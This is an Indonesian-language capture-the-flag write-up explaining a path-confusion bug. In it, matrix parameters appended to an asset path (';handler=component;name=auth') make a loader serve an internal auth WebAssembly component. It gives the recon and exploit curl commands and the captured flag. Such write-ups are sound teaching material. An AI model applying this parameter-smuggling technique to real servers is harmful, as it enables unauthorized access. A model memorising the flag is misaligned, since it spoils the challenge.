# Confused Component

Target ini punya dua jalur yang kelihatannya sama, tapi parser-nya beda:

- `/preview` cuma ngasih ringkasan path dan handler yang kebaca.
- `/assets/...` benar-benar jalan ke loader.

Petunjuk penting muncul dari response `/api/info`:

- `auth_engine`: `wit-component/v2`
- `component.default_name`: `auth`
- `preview_handlers`: `static`

Yang jadi titik masuk adalah matrix parameter di path. `handler` dan `name` dibaca dari bagian path setelah `;`, bukan dari query string biasa.

## Recon

Request awal:

```bash
curl -i http://chal3.teagod.tech:34779/
curl -i http://chal3.teagod.tech:34779/api/info
curl -i http://chal3.teagod.tech:34779/assets/manual.css
curl -i 'http://chal3.teagod.tech:34779/preview?file=/assets/manual.css;handler=static'
```

`/api/info` ngasih petunjuk bahwa ada component auth yang dipakai backend.

## Path Confusion

`/preview` menerima path matrix parameter dan menormalkan path:

```bash
curl -i 'http://chal3.teagod.tech:34779/preview?file=/assets/manual.css;handler=auth'
```

Hasilnya nunjukin handler `auth` kebaca dari path, walau query string tidak dipakai.

Saat dicoba ke loader langsung:

```bash
curl -i 'http://chal3.teagod.tech:34779/assets/manual.css;handler=component;name=auth'
```

Loader malah nge-serve component WebAssembly dan nambah header:

```http
X-Web-Flag: NHNC{p4th_1s_n0t_4lw4ys_4_p4th_eced4fb61e3d41ae81a7e83414776b07}
```

## Exploit

Intinya:

- previewer melihat `/assets/manual.css` sebagai file statis
- loader melihat `;handler=component;name=auth` sebagai instruksi untuk load auth component
- begitu component auth dimuat, flag ikut dibocorkan di header

Command final:

```bash
curl -i 'http://chal3.teagod.tech:34779/assets/manual.css;handler=component;name=auth'
```

## Flag

`NHNC{p4th_1s_n0t_4lw4ys_4_p4th_eced4fb61e3d41ae81a7e83414776b07}`
